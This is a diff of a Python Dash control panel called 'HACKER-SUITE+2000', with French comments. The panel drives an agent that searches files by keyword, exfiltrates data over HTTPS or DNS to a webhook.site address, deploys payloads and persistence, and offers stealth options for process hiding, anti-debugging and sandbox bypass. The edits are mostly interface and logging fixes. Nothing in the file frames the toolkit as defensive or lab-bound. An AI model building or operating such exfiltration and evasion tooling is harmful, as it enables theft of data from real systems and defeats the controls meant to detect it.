@@ -12,6 +12,7 @@ import signal
 import re
 import shutil
 from datetime import datetime
+import mimetypes # Importation manquante pour mimetypes.guess_type
 
 # --- Nettoyage du cache Python (important pour les mises à jour de modules) ---
 def clean_pycache():
@@ -33,7 +34,8 @@ if AGENT_DIR not in sys.path:
 _GLOBAL_MODULE_LOGGER = None
 try:
     from modules.logger import Logger as AgentLogger
-    _GLOBAL_MODULE_LOGGER = AgentLogger(log_file_path=None, cipher_key=None, debug_mode=True, stdout_enabled=False)
+    # Correction ici: stdout_enabled=True pour que les logs soient capturés par LogStreamer
+    _GLOBAL_MODULE_LOGGER = AgentLogger(log_file_path=None, cipher_key=None, debug_mode=True, stdout_enabled=True)
     print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] modules.logger.Logger importé et configuré.")
 except ImportError as e:
     class UIMockLoggerFallback:
@@ -79,16 +81,24 @@ except ImportError as e:
     global_log_streamer = MockLogStreamer()
     print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] CRITICAL: Erreur d'importation de modules.log_streamer: {e}. Les logs en direct ne seront pas disponibles.")
 
-
-explorer_log_states = {
-    'file_explorer': {'last_index': 0, 'logs': []},
-    'web_explorer': {'last_index': 0, 'logs': []}
-}
+# Permet à Dash de maintenir l'état entre les rechargements du serveur en mode debug.
+# Sinon, ces variables seraient réinitialisées, causant une perte de logs visibles.
+if not hasattr(sys, '_explorer_log_states'):
+    sys._explorer_log_states = {
+        'file_explorer': {'last_index': 0, 'logs': []},
+        'web_explorer': {'last_index': 0, 'logs': []}
+    }
+explorer_log_states = sys._explorer_log_states
 
 # --- Définition des classes Mock/Fallback pour les explorateurs ---
 class BaseMockExplorer:
     TARGET_TYPE_FILE = "file"
     TARGET_TYPE_DIRECTORY = "directory"
+    TARGET_TYPE_CONTENT = "content_match" # Ajouté pour WebExplorer
+    TARGET_TYPE_API = "api_endpoint"      # Ajouté pour WebExplorer
+    TARGET_TYPE_VULN = "vulnerable_path"  # Ajouté pour WebExplorer
+    TARGET_TYPE_SITEMAP_ENTRY = "sitemap_entry" # Ajouté pour WebExplorer
+    TARGET_TYPE_FORM = "form_data" # Ajouté pour WebExplorer
 
     def __init__(self, debug_mode: bool = False):
         self._LOGGER = _GLOBAL_MODULE_LOGGER
@@ -101,8 +111,19 @@ class BaseMockExplorer:
         self._LOGGER.log_info(f"[{self.__class__.__name__}] Fonctionnalité explore_path non implémentée (mock).")
         return []
 
+    # explore_url doit être la méthode appelée par control_panel
     def explore_url(self, *args, **kwargs):
         self._LOGGER.log_info(f"[{self.__class__.__name__}] Fonctionnalité explore_url non implémentée (mock).")
+        # Simule une erreur HTTP pour tester le message d'erreur si la fonction est appelée
+        time.sleep(1)
+        self._LOGGER.log_error(f"[{self.__class__.__name__}] Simulation d'erreur: Impossible de se connecter (mock).")
+        return []
+
+    # Nouvelle méthode pour la récursion dans WebExplorer
+    def explore_url_recursive_entry(self, *args, **kwargs):
+        self._LOGGER.log_info(f"[{self.__class__.__name__}] Fonctionnalité explore_url_recursive_entry non implémentée (mock).")
+        time.sleep(1)
+        self._LOGGER.log_error(f"[{self.__class__.__name__}] Simulation d'erreur: Exploration récursive impossible (mock).")
         return []
 
     def read_file_content(self, *args, **kwargs):
@@ -123,6 +144,18 @@ class BaseMockExplorer:
 
     def get_found_targets(self):
         return []
+    
+    def get_exploration_stats(self):
+        # Pour le mock, renvoie des stats de base
+        return {
+            'urls_visited': 0, 'urls_queued': 0, 'urls_skipped_external': 0, 'urls_skipped_visited': 0, 'urls_skipped_robots': 0,
+            'files_identified': 0, 'dirs_identified': 0, 'content_matches': 0,
+            'api_endpoints_identified': 0, 'vuln_paths_identified': 0, 'sitemap_entries_identified': 0,
+            'forms_identified': 0, 'requests_successful': 0, 'requests_failed': 0, 'total_requests_made': 0,
+            'bytes_downloaded_html': 0, 'bytes_downloaded_files': 0,
+            'last_status': 'Mock Idle', 'current_url': 'N/A',
+            'start_time': None, 'end_time': None, 'duration_seconds': 0
+        }
 
     def reset_state(self):
         self._LOGGER.log_info(f"[{self.__class__.__name__}] État réinitialisé (mock).")
@@ -137,22 +170,24 @@ OriginalWebExplorer = BaseMockExplorer
 AES256Cipher = None
 
 try:
-    from modules.file_explorer import FileExplorer as ImportedFileExplorer
-    OriginalFileExplorer = ImportedFileExplorer
-    # Assurez-vous que le LOGGER est bien assigné après l'import si la classe a un _LOGGER statique ou de classe
-    # Si la classe l'initialise elle-même, assurez-vous qu'elle utilise _GLOBAL_MODULE_LOGGER
-    if hasattr(OriginalFileExplorer, '_LOGGER'):
-        OriginalFileExplorer._LOGGER = _GLOBAL_MODULE_LOGGER
-    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] modules.file_explorer.FileExplorer importé avec succès.")
+    from modules.file_explorer import FileExplorer # Importe la classe FileExplorer
+    # Assigne directement le _GLOBAL_MODULE_LOGGER à la variable globale _LOGGER du module file_explorer
+    # C'EST LA LIGNE CLÉ POUR CORRIGER LE FALLBACK LOGGER
+    import modules.file_explorer
+    modules.file_explorer._LOGGER = _GLOBAL_MODULE_LOGGER
+    OriginalFileExplorer = FileExplorer
+    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] modules.file_explorer.FileExplorer importé et logger injecté avec succès.")
 except ImportError as e:
     print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] CRITICAL: Erreur d'importation de modules.file_explorer: {e}. Les fonctionnalités de File Explorer seront limitées.")
 
 try:
-    from modules.web_explorer import WebExplorer as ImportedWebExplorer
-    OriginalWebExplorer = ImportedWebExplorer
-    if hasattr(OriginalWebExplorer, '_LOGGER'):
-        OriginalWebExplorer._LOGGER = _GLOBAL_MODULE_LOGGER
-    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] modules.web_explorer.WebExplorer importé avec succès.")
+    from modules.web_explorer import WebExplorer # Importe la classe WebExplorer
+    # Assigne directement le _GLOBAL_MODULE_LOGGER à la variable globale _LOGGER du module web_explorer
+    # C'EST LA LIGNE CLÉ POUR CORRIGER LE FALLBACK LOGGER
+    import modules.web_explorer
+    modules.web_explorer._LOGGER = _GLOBAL_MODULE_LOGGER
+    OriginalWebExplorer = WebExplorer
+    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] modules.web_explorer.WebExplorer importé et logger injecté avec succès.")
 except ImportError as e:
     print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] CRITICAL: Erreur d'importation de modules.web_explorer: {e}. Les fonctionnalités de Web Explorer seront limitées.")
 
@@ -255,9 +290,9 @@ if not shared_config_data or 'aes_key' not in shared_config_data:
         "default_payload_url": "",
         "default_payload_path": "",
         "default_threads": 4, # Valeur par défaut numérique, ne pas en faire une liste par erreur
-        "default_debug_mode": True,
-        "default_no_clean": True,
-        "default_no_anti_evasion": False,
+        "default_debug_mode": ["debug"], # Type corrigé : liste pour initialisation
+        "default_no_clean": ["no-clean"],   # Type corrigé : liste pour initialisation
+        "default_no_anti_evasion": [], # Type corrigé : liste vide
         "default_explorer_target_host": "http://127.0.0.1",
         "default_explorer_base_path": "/var/www/html" if os.path.exists("/var/www/html") else "",
         "default_explorer_depth": 3,
@@ -270,6 +305,7 @@ if not shared_config_data or 'aes_key' not in shared_config_data:
     _GLOBAL_MODULE_LOGGER.log_warning(f"Veuillez remplacer l'URL 'https://webhook.site/VOTRE_URL_UNIQUE_ICI' dans le fichier '{SHARED_CONFIG_FILE}' par votre URL webhook.site via l'interface ou manuellement !")
 
 # --- Valeurs par défaut de l'UI (utilisées dans le layout) ---
+# Correction: Joindre les listes en chaînes de caractères pour les inputs cachés
 DEFAULT_AES_KEY = shared_config_data.get('aes_key', '')
 DEFAULT_TARGET_URL = shared_config_data.get('default_target_url', '')
 DEFAULT_SCAN_PATH = shared_config_data.get('default_scan_path', os.path.expanduser('~'))
@@ -284,22 +320,25 @@ DEFAULT_REGEX_PATTERNS = shared_config_data.get('default_regex_patterns', '')
 DEFAULT_PAYLOAD_URL = shared_config_data.get('default_payload_url', '')
 DEFAULT_PAYLOAD_PATH = shared_config_data.get('default_payload_path', '')
 DEFAULT_THREADS = shared_config_data.get('default_threads', 4)
-DEFAULT_DEBUG_MODE = ['debug'] if shared_config_data.get('default_debug_mode', True) else []
-DEFAULT_NO_CLEAN = ['no-clean'] if shared_config_data.get('default_no_clean', True) else []
-DEFAULT_NO_ANTI_EVASION = ['no-anti-evasion'] if shared_config_data.get('default_no_anti_evasion', False) else []
+# Modifier ces valeurs par défaut pour qu'elles soient des chaînes, pas des listes directes
+# Si la liste est vide, la chaîne résultante de ','.join([]) est une chaîne vide '', ce qui est correct pour dcc.Input
+DEFAULT_DEBUG_MODE = ','.join(shared_config_data.get('default_debug_mode', []))
+DEFAULT_NO_CLEAN = ','.join(shared_config_data.get('default_no_clean', []))
+DEFAULT_NO_ANTI_EVASION = ','.join(shared_config_data.get('default_no_anti_evasion', []))
 DEFAULT_EXPLORER_TARGET_HOST = shared_config_data.get('default_explorer_target_host', "http://127.0.0.1")
 DEFAULT_EXPLORER_BASE_PATH = shared_config_data.get('default_explorer_base_path', "")
 DEFAULT_EXPLORER_DEPTH = shared_config_data.get('default_explorer_depth', 3)
 DEFAULT_EXFIL_METHOD = shared_config_data.get('default_exfil_method', 'https')
-DEFAULT_STEALTH_HIDE_PROCESS = shared_config_data.get('default_stealth_hide_process', [])
-DEFAULT_STEALTH_ANTI_DEBUG = shared_config_data.get('default_stealth_anti_debug', [])
-DEFAULT_STEALTH_SANDBOX_BYPASS = shared_config_data.get('default_stealth_sandbox_bypass', [])
+# Modifier ces valeurs par défaut pour qu'elles soient des chaînes, pas des listes directes
+DEFAULT_STEALTH_HIDE_PROCESS = ','.join(shared_config_data.get('default_stealth_hide_process', []))
+DEFAULT_STEALTH_ANTI_DEBUG = ','.join(shared_config_data.get('default_stealth_anti_debug', []))
+DEFAULT_STEALTH_SANDBOX_BYPASS = ','.join(shared_config_data.get('default_stealth_sandbox_bypass', []))
 
 
 # --- Initialisation de l'application Dash ---
 app = dash.Dash(__name__, title="HACKER-SUITE+2000",
                 external_stylesheets=[
-                    'https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap' # J'ai corrigé la fin de l'URL pour qu'elle soit complète
+                    'https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap'
                 ],
                 prevent_initial_callbacks='initial_duplicate',
                 assets_folder=os.path.join(AGENT_DIR, 'display')
@@ -315,16 +354,8 @@ CYBER_OPS_STYLE = {
     'fontFamily': '"Roboto Mono", "Consolas", "Courier New", monospace',
     'padding': '0',
     'margin': '0',
-    # --- MODIFICATIONS ICI ---
-    # Ces propriétés étaient la cause du blocage de défilement sur mobile
-    # car elles forçaient le div racine à prendre toute la hauteur de la fenêtre
-    # et à se comporter en flexbox.
-    # 'minHeight': '100vh',
-    # 'display': 'flex',
-    # 'flexDirection': 'column',
-    'overflowY': 'auto',  # Permet au contenu de défiler si la hauteur dépasse
-    'overflowX': 'hidden', # Empêche le défilement horizontal indésirable
-    # --- FIN MODIFICATIONS ---
+    'overflowY': 'auto',
+    'overflowX': 'hidden',
     'fontSize': '14px',
     'backgroundImage': 'linear-gradient(to bottom right, #0A0A0A, #1A1A1A)',
     'backgroundAttachment': 'fixed',
@@ -362,7 +393,7 @@ CYBER_TAB_STYLE = {
     'color': '#00AACC',
     'border': '1px solid #333333',
     'borderBottom': 'none',
-    'borderRadius': '6px 6px 0 0',
+    'borderRadius': '6px 66px 0 0',
     'padding': '15px 30px',
     'marginRight': '8px',
     'fontSize': '1.3em',
@@ -379,7 +410,7 @@ CYBER_TAB_SELECTED_STYLE = {
     'color': '#7FFF00',
     'border': '1px solid #7FFF00',
     'borderBottom': 'none',
-    'borderRadius': '6px 6px 0 0',
+    'borderRadius': '6px 66px 0 0',
     'padding': '15px 30px',
     'marginRight': '8px',
     'fontSize': '1.3em',
@@ -448,12 +479,9 @@ CYBER_BUTTON_BASE = {
     'transition': 'all 0.2s ease-in-out',
     'textTransform': 'uppercase',
     'letterSpacing': '1.5px',
-    # --- AJOUTS ICI pour la flexibilité des boutons eux-mêmes ---
-    'flex': '1 1 150px', # Permet aux boutons de grandir/rétrécir (base de 150px)
-    'minWidth': '150px', # S'assure qu'ils ne deviennent pas trop petits
-    'maxWidth': 'calc(50% - 7.5px)', # Empêche d'être trop larges si seulement 2 boutons sur une ligne
-                                   # (50% moins la moitié du gap ajusté de 15px)
-    # --- FIN AJOUTS ---
+    'flex': '1 1 150px',
+    'minWidth': '150px',
+    'maxWidth': 'calc(50% - 7.5px)',
     'background': 'linear-gradient(145deg, #2A2A2A, #1A1A1A)',
     'boxShadow': '5px 5px 10px rgba(0,0,0,0.3), -5px -5px 10px rgba(30,30,30,0.2)',
     'border': '1px solid #333333',
@@ -653,7 +681,7 @@ app.layout = html.Div(style=CYBER_OPS_STYLE, children=[
         "+2000"
     ], style={
         **CYBER_HEADER_STYLE,
-        'color': '#FF0000', # Changé pour un rouge vif
+        'color': '#FF0000',
         'textShadow': '0 0 20px rgba(255,0,0,0.9), 0 0 30px rgba(255,0,0,0.6)',
         'fontSize': '3.5em',
         'letterSpacing': '8px'
@@ -662,11 +690,10 @@ app.layout = html.Div(style=CYBER_OPS_STYLE, children=[
     # Les onglets DCC vont ici
     dcc.Tabs(
         id="cyber-tabs",
-        value='tab-dynamic-display', # METTEZ CETTE VALEUR ICI pour qu'il soit s>
+        value='tab-dynamic-display',
         parent_className='custom-tabs-container',
         className='custom-tabs',
         children=[
-            # DYNAMIC DISPLAY est maintenant le premier onglet dans la liste
             dcc.Tab(label=':: DYNAMIC DISPLAY ::', value='tab-dynamic-display', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
             dcc.Tab(label=':: DASHBOARD ::', value='tab-dashboard', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
             dcc.Tab(label=':: AGENT CONTROL ::', value='tab-agent-control', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
@@ -674,41 +701,33 @@ app.layout = html.Div(style=CYBER_OPS_STYLE, children=[
             dcc.Tab(label=':: SYSTEM PROFILER ::', value='tab-system-profiler', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
             dcc.Tab(label=':: PAYLOADS & PERSISTENCE ::', value='tab-payloads', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
             dcc.Tab(label=':: STEALTH & EVASION ::', value='tab-stealth', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
-            dcc.Tab(label=':: LOGS & STATUS ::', value='tab-logs-status', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE),
+            dcc.Tab(label=':: LOGS & STATUS ::', value='tab-logs-status', style=CYBER_TAB_STYLE, selected_style=CYBER_TAB_SELECTED_STYLE), # Correction ici
+
         ],
         style={**CYBER_TABS_CONTAINER_STYLE}
-    ), # <-- Cette parenthèse fermante a été ajoutée pour le dcc.Tabs
+    ),
 
-    # Conservez flexGrow: '1' ici, c'est ce qui permet au contenu de l'onglet de s'étendre
-    # et au reste de la page (tabs et header) de rester en haut.
     html.Div(id='tabs-content', style={'flexGrow': '1'}),
 
     # --- Éléments cachés pour persister l'état (TOUS SONT dcc.Input ou html.Pre) ---
     html.Div(id='hidden-elements', style={'display': 'none'}, children=[
-        # Un dcc.Store simple pour déclencher l'initialisation du LogStreamer
         dcc.Store(id='log-streamer-init-trigger', data=0),
 
         dcc.Interval(
             id='interval-explorer-logs',
-            interval=1 * 1000, # Rafraîchit toutes les 1 seconde
+            interval=1 * 1000,
             n_intervals=0
         ),
         dcc.Interval(
             id='interval-dashboard-refresh',
-            interval=2 * 1000, # Rafraîchit toutes les 2 secondes
+            interval=2 * 1000,
             n_intervals=0
         ),
 
-        # NOUVEL EMPLACEMENT UNIQUE POUR LES LOGS DE L'EXPLORATEUR (tampon toujours présent)
-        html.Pre(id='_hidden_explorer_logs_buffer', style={'display': 'none'}),
-        
-        # Déplacé ici pour être toujours présent (celui que le dashboard et logs/status liront)
+        html.Pre(id='_hidden_explorer_logs_buffer', style={'display': 'none'}), # Cache pour les logs de l'explorateur
         html.Pre(id='_hidden_dashboard_live_logs_buffer', style={'display': 'none'}),
-        # FIX: Ajout de l'output des logs de l'agent lancé pour qu'il soit toujours dans le DOM
-        html.Pre(id='live-log-stream-display-buffer', style={'display': 'none'}),
+        html.Pre(id='live-log-stream-display-buffer', style={'display': 'none'}), # <-- Ce composant va stocker les logs généraux et sera mis à jour par l'intervalle
 
-
-        # Agent Control States (certains sont déjà des hidden inputs)
         dcc.Input(id='target-url-hidden', type='text', value=DEFAULT_TARGET_URL),
         dcc.Input(id='scan-path-hidden', type='text', value=DEFAULT_SCAN_PATH),
         dcc.Input(id='aes-key-hidden', type='text', value=DEFAULT_AES_KEY),
@@ -721,24 +740,19 @@ app.layout = html.Div(style=CYBER_OPS_STYLE, children=[
         dcc.Input(id='max-size-hidden', type='text', value=DEFAULT_MAX_SIZE),
         dcc.Input(id='keywords-hidden', type='text', value=DEFAULT_KEYWORDS),
         dcc.Input(id='regex-patterns-hidden', type='text', value=DEFAULT_REGEX_PATTERNS),
-        # FIX: Ces inputs étaient visibles dans les onglets, maintenant ils sont déplacés ici.
-        # Les composants visibles dans les onglets écriront vers ceux-ci.
         dcc.Input(id='payload-url-hidden', type='text', value=DEFAULT_PAYLOAD_URL),
         dcc.Input(id='payload-path-hidden', type='text', value=DEFAULT_PAYLOAD_PATH),
         dcc.Input(id='threads-hidden', type='number', value=DEFAULT_THREADS),
-        dcc.Input(id='debug-mode-hidden', type='text', value=str(DEFAULT_DEBUG_MODE)),
-        dcc.Input(id='no-clean-hidden', type='text', value=str(DEFAULT_NO_CLEAN)),
-        dcc.Input(id='no-anti-evasion-hidden', type='text', value=str(DEFAULT_NO_ANTI_EVASION)),
-
-        # Explorer States
+        dcc.Input(id='debug-mode-hidden', type='text', value=DEFAULT_DEBUG_MODE),
+        dcc.Input(id='no-clean-hidden', type='text', value=DEFAULT_NO_CLEAN),
+        dcc.Input(id='no-anti-evasion-hidden', type='text', value=DEFAULT_NO_ANTI_EVASION),
         dcc.Input(id='explorer-target-host-hidden', type='text', value=DEFAULT_EXPLORER_TARGET_HOST),
         dcc.Input(id='explorer-base-path-hidden', type='text', value=DEFAULT_EXPLORER_BASE_PATH),
         dcc.Input(id='explorer-max-depth-hidden', type='number', value=DEFAULT_EXPLORER_DEPTH),
 
-        # Hidden store for last log index (for explorer logs)
-        dcc.Store(id='explorer-log-last-index', data={'file': 0, 'web': 0}),
+        # ID du dcc.Store corrigé ici pour correspondre aux clés utilisées dans refresh_all_live_logs
+        dcc.Store(id='explorer-log-last-index', data={'file_explorer': 0, 'dashboard_stream': 0}),
 
-        # Global store for agent stats
         dcc.Store(id='agent-stats-store', data={
             'files_scanned': 0,
             'files_matched': 0,
@@ -749,29 +763,24 @@ app.layout = html.Div(style=CYBER_OPS_STYLE, children=[
             'agent_last_activity': 'N/A',
             'agent_start_time': 'N/A'
         }),
-        # Nouveaux hidden inputs pour les options de stealth
-        dcc.Input(id='stealth-hide-process-hidden', type='text', value=str(DEFAULT_STEALTH_HIDE_PROCESS)),
-        dcc.Input(id='stealth-anti-debug-hidden', type='text', value=str(DEFAULT_STEALTH_ANTI_DEBUG)),
-        dcc.Input(id='stealth-sandbox-bypass-hidden', type='text', value=str(DEFAULT_STEALTH_SANDBOX_BYPASS)),
-    ]), # <-- Fin de children pour html.Div(id='hidden-elements')
-]) # <-- Fin de children pour app.layout et appel de html.Div()
+        dcc.Input(id='stealth-hide-process-hidden', type='text', value=DEFAULT_STEALTH_HIDE_PROCESS),
+        dcc.Input(id='stealth-anti-debug-hidden', type='text', value=DEFAULT_STEALTH_ANTI_DEBUG),
+        dcc.Input(id='stealth-sandbox-bypass-hidden', type='text', value=DEFAULT_STEALTH_SANDBOX_BYPASS),
+    ]),
+])
 
 
 # Callback pour rendre le contenu des onglets
 @app.callback(
     [Output('tabs-content', 'children'),
-     Output('payload-url-hidden', 'value', allow_duplicate=True), # Permet de mettre à jour l'input caché
-     Output('payload-path-hidden', 'value', allow_duplicate=True)], # Permet de mettre à jour l'input caché
+     Output('payload-url-hidden', 'value', allow_duplicate=True),
+     Output('payload-path-hidden', 'value', allow_duplicate=True)],
     Input('cyber-tabs', 'value'),
     State('target-url-hidden', 'value'), State('scan-path-hidden', 'value'), State('aes-key-hidden', 'value'),
     State('exfil-method-hidden', 'value'), State('dns-server-hidden', 'value'), State('dns-domain-hidden', 'value'),
     State('file-types-hidden', 'value'), State('exclude-types-hidden', 'value'), State('min-size-hidden', 'value'),
     State('max-size-hidden', 'value'), State('keywords-hidden', 'value'), State('regex-patterns-hidden', 'value'),
-    State('payload-url-hidden', 'value'), State('payload-path-hidden', 'value'), # Ces states sont les valeurs actuelles des hidden inputs
-    # On NE DOIT PAS passer les IDs des inputs visibles ici en tant que State.
-    # Ils ne sont pas garantis d'être dans le DOM, ce qui cause l'erreur.
-    # On utilisera les valeurs déjà en mémoire (payload_url, payload_path)
-    # ou les valeurs transmises par le callback de l'onglet quand il est actif.
+    State('payload-url-hidden', 'value'), State('payload-path-hidden', 'value'),
     State('threads-hidden', 'value'),
     State('debug-mode-hidden', 'value'), State('no-clean-hidden', 'value'), State('no-anti-evasion-hidden', 'value'),
     State('explorer-target-host-hidden', 'value'), State('explorer-base-path-hidden', 'value'), State('explorer-max-depth-hidden', 'value'),
@@ -779,36 +788,26 @@ app.layout = html.Div(style=CYBER_OPS_STYLE, children=[
     State('stealth-hide-process-hidden', 'value'),
     State('stealth-anti-debug-hidden', 'value'),
     State('stealth-sandbox-bypass-hidden', 'value'),
-    # Ajout du state pour le buffer des logs de l'explorateur
-    State('_hidden_explorer_logs_buffer', 'children'), 
-    # Ajout du state pour le buffer des logs du tableau de bord
-    State('_hidden_dashboard_live_logs_buffer', 'children')
+    # On ne lit plus les *contenus* des buffers ici pour les passer en `children` des éléments visibles.
+    # On lit uniquement l'onglet actif et les states non liées aux logs visibles
+    # State('_hidden_explorer_logs_buffer', 'children'), # RETIRE
+    # State('live-log-stream-display-buffer', 'children') # RETIRE
 )
 def render_tab_content(tab,
                        target_url, scan_path, aes_key, exfil_method, dns_server, dns_domain, file_types, exclude_types, min_size, max_size, keywords, regex_patterns,
-                       # Les arguments pour les payloads viennent maintenant directement des hidden inputs via State
-                       payload_url, payload_path, # Ce sont les valeurs des inputs cachés
+                       payload_url, payload_path,
                        threads, debug_mode_val_str, no_clean_val_str, no_anti_evasion_val_str,
                        explorer_target_host, explorer_base_path, explorer_max_depth, agent_stats_data,
-                       stealth_hide_process_val_str, stealth_anti_debug_val_str, stealth_sandbox_bypass_val_str,
-                       explorer_logs_buffer_content, dashboard_live_logs_buffer_content):
+                       stealth_hide_process_val_str, stealth_anti_debug_val_str, stealth_sandbox_bypass_val_str):
+                       # explorer_logs_buffer_content, dashboard_live_logs_buffer_content): # RETIRE
 
-    # Les valeurs de payload_url et payload_path sont déjà celles des hidden inputs
-    # quand ce callback est déclenché par un changement d'onglet.
-    # La logique de mise à jour des hidden inputs depuis les inputs visibles
-    # sera gérée par les boutons APPLY qui sauvegardent directement dans la config partagée
-    # (et par extension, mettent à jour les hidden inputs lors du prochain re-render du layout).
-    
-    # Il n'y a plus besoin de lire les inputs visibles ici car ils causent l'erreur.
-    # Les valeurs passées à create_input_section viennent des hidden inputs.
-
-
-    debug_mode_val = eval(debug_mode_val_str) if isinstance(debug_mode_val_str, str) else debug_mode_val_str
-    no_clean_val = eval(no_clean_val_str) if isinstance(no_clean_val_str, str) else no_clean_val_str
-    no_anti_evasion_val = eval(no_anti_evasion_val_str) if isinstance(no_anti_evasion_val_str, str) else no_anti_evasion_val_str
-    stealth_hide_process_val = eval(stealth_hide_process_val_str) if isinstance(stealth_hide_process_val_str, str) else stealth_hide_process_val_str
-    stealth_anti_debug_val = eval(stealth_anti_debug_val_str) if isinstance(stealth_anti_debug_val_str, str) else stealth_anti_debug_val_str
-    stealth_sandbox_bypass_val = eval(stealth_sandbox_bypass_val_str) if isinstance(stealth_sandbox_bypass_val_str, str) else stealth_sandbox_bypass_val_str
+    # Les valeurs des checklists doivent être converties en listes pour la création de create_checklist_section
+    debug_mode_val = debug_mode_val_str.split(',') if debug_mode_val_str else []
+    no_clean_val = no_clean_val_str.split(',') if no_clean_val_str else []
+    no_anti_evasion_val = no_anti_evasion_val_str.split(',') if no_anti_evasion_val_str else []
+    stealth_hide_process_val = stealth_hide_process_val_str.split(',') if stealth_hide_process_val_str else []
+    stealth_anti_debug_val = stealth_anti_debug_val_str.split(',') if stealth_anti_debug_val_str else []
+    stealth_sandbox_bypass_val = stealth_sandbox_bypass_val_str.split(',') if stealth_sandbox_bypass_val_str else []
 
 
     # Options pour les Checklists et Dropdown
@@ -829,7 +828,7 @@ def render_tab_content(tab,
             html.Label(label_text, style={'color': '#00FFFF', 'marginBottom': '8px', 'display': 'block', 'fontSize': '0.95rem'}),
             html.Div([
                 dcc.Input(
-                    id=input_id, # Cet ID est utilisé pour l'input VISIBLE dans l'onglet
+                    id=input_id,
                     type=type,
                     value=value,
                     placeholder=placeholder,
@@ -838,7 +837,7 @@ def render_tab_content(tab,
                     min=min,
                     max=max,
                 ) if options is None else dcc.Dropdown(
-                    id=input_id, # Cet ID est utilisé pour le dropdown VISIBLE dans l'onglet
+                    id=input_id,
                     options=options,
                     value=value,
                     style={**CYBER_INPUT_STYLE, 'color': '#7FFF00', 'padding': '0', 'minHeight': '45px', 'display': 'flex', 'alignItems': 'center'},
@@ -847,7 +846,9 @@ def render_tab_content(tab,
                     className="cyber-dropdown",
                 ),
                 html.Button('APPLY', id={'type': 'apply-button', 'input_id': input_id}, n_clicks=0,
-                            style=CYBER_BUTTON_APPLY)
+                            style=CYBER_BUTTON_APPLY),
+                # Output factice dynamique pour les messages de confirmation/débogage
+                html.Div(id={'type': 'dummy-output', 'input_id': input_id}, style={'display': 'none'})
             ], style=CYBER_INPUT_WRAPPER_STYLE)
         ])
 
@@ -856,20 +857,21 @@ def render_tab_content(tab,
             html.Label(label_text, style={'color': '#00FFFF', 'marginBottom': '8px', 'display': 'block', 'fontSize': '0.95rem'}),
             html.Div([
                 dcc.Checklist(
-                    id=input_id, # Cet ID est utilisé pour la checklist VISIBLE dans l'onglet
+                    id=input_id,
                     options=options,
                     value=value,
                     style={'color': '#7FFF00', 'flexGrow': '1', 'paddingTop': '10px'},
                     labelStyle={'display': 'flex', 'alignItems': 'center', 'marginBottom': '10px'}
                 ),
-                html.Button('APPLY', id={'type': 'apply-button', 'input_id': input_id}, n_clicks=0, style=CYBER_BUTTON_APPLY)
+                html.Button('APPLY', id={'type': 'apply-button', 'input_id': input_id}, n_clicks=0, style=CYBER_BUTTON_APPLY),
+                # Output factice dynamique pour les messages de confirmation/débogage
+                html.Div(id={'type': 'dummy-output', 'input_id': input_id}, style={'display': 'none'})
             ], style={**CYBER_INPUT_WRAPPER_STYLE, 'alignItems': 'flex-start', 'marginBottom': '0px'})
         ], style={'marginBottom': '20px'})
 
 
     if tab == 'tab-dashboard':
         return html.Div(style=CYBER_SECTION_CONTENT_STYLE, children=[
-            # interval-dashboard-refresh est maintenant dans hidden-elements
             html.Div([
                 html.Div(style=CYBER_STAT_CARD_STYLE, children=[
                     html.Div(f"{agent_stats_data.get('files_scanned', 0)}", style=CYBER_STAT_VALUE_STYLE, id='stat-files-scanned'),
@@ -887,11 +889,7 @@ def render_tab_content(tab,
                     html.Div(f"{agent_stats_data.get('exfil_success_count', 0)}", style=CYBER_STAT_VALUE_STYLE, id='stat-exfil-success'),
                     html.Div("EXFIL SUCCESS", style=CYBER_STAT_LABEL_STYLE)
                 ]),
-                html.Div(style=CYBER_STAT_CARD_STYLE, children=[
-                    html.Div(f"{agent_stats_data.get('exfil_failed_count', 0)}", style=CYBER_STAT_VALUE_STYLE, id='stat-exfil-failed'),
-                    html.Div("EXFIL FAILED", style=CYBER_STAT_LABEL_STYLE)
-                ]),
-                 html.Div(style={**CYBER_STAT_CARD_STYLE, 'minWidth': '280px'}, children=[
+                html.Div(style={**CYBER_STAT_CARD_STYLE, 'minWidth': '280px'}, children=[
                     html.Div(agent_stats_data.get('agent_status', 'INACTIVE'), style={**CYBER_STAT_VALUE_STYLE, 'color': '#FFD700' if agent_stats_data.get('agent_status') == 'RUNNING' else '#FF5555'}, id='stat-agent-status'),
                     html.Div("AGENT STATUS", style=CYBER_STAT_LABEL_STYLE)
                 ]),
@@ -906,9 +904,9 @@ def render_tab_content(tab,
             ], style={'display': 'flex', 'flexWrap': 'wrap', 'justifyContent': 'center', 'gap': '20px', 'marginBottom': '40px'}),
 
             html.H2(":: LIVE SYSTEM ACTIVITY (AGENT LOGS) ::", style=CYBER_SECTION_HEADER_STYLE),
-            # Utilise le contenu du buffer caché
-            html.Pre(dashboard_live_logs_buffer_content, style={**CYBER_STATUS_BOX_STYLE, 'minHeight': '200px', 'maxHeight': '400px'}, id='dashboard-live-logs_visible'),
-        ]), payload_url, payload_path # Retourne les valeurs des hidden inputs (pas les visibles)
+            # children=None pour laisser refresh_all_live_logs le remplir (via le nouveau callback de MAJ d'UI)
+            html.Pre(None, style={**CYBER_STATUS_BOX_STYLE, 'minHeight': '200px', 'maxHeight': '400px'}, id='dashboard-live-logs_display'),
+        ]), payload_url, payload_path
     elif tab == 'tab-agent-control':
